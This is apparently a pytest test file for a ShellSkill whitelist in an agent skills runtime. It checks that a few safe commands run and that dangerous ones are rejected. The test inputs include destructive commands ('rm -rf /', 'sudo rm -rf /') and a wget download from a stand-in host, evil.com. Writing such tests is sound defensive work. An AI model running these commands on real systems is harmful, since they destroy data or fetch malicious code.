"""Tests for ShellSkill whitelist enforcement."""
import pytest
from app.services.skills_runtime_service import ShellSkill


def test_shell_whitelist_contents():
    """ShellSkill whitelist contains expected safe commands."""
    skill = ShellSkill()
    assert "df" in skill.WHITELIST
    assert "ps" in skill.WHITELIST
    assert "git" in skill.WHITELIST
    assert "brew" in skill.WHITELIST
    assert "ollama" in skill.WHITELIST


@pytest.mark.asyncio
async def test_shell_blocks_rm():
    """ShellSkill blocks dangerous commands like rm."""
    skill = ShellSkill()
    result = await skill.run("rm -rf /")
    assert "error" in result
    assert "not in whitelist" in result["error"]


@pytest.mark.asyncio
async def test_shell_blocks_python():
    """ShellSkill blocks python execution."""
    skill = ShellSkill()
    result = await skill.run("python -c 'import os; os.system(\"whoami\")'")
    assert "error" in result


@pytest.mark.asyncio
async def test_shell_blocks_sudo():
    """ShellSkill blocks sudo."""
    skill = ShellSkill()
    result = await skill.run("sudo rm -rf /")
    assert "error" in result


@pytest.mark.asyncio
async def test_shell_empty_command():
    """ShellSkill rejects empty commands."""
    skill = ShellSkill()
    result = await skill.run("")
    assert "error" in result


@pytest.mark.asyncio
async def test_shell_allows_whitelisted():
    """ShellSkill allows whitelisted commands."""
    skill = ShellSkill()
    result = await skill.run("whoami", timeout=5)
    # whoami is in whitelist, should succeed (or timeout on CI)
    assert isinstance(result, dict)
    if "error" not in result:
        assert "stdout" in result


def test_shell_metadata():
    """ShellSkill has correct metadata."""
    skill = ShellSkill()
    assert skill.name == "shell"


@pytest.mark.asyncio
async def test_shell_blocks_wget():
    """ShellSkill blocks wget."""
    skill = ShellSkill()
    result = await skill.run("wget https://evil.com/malware")
    assert "error" in result
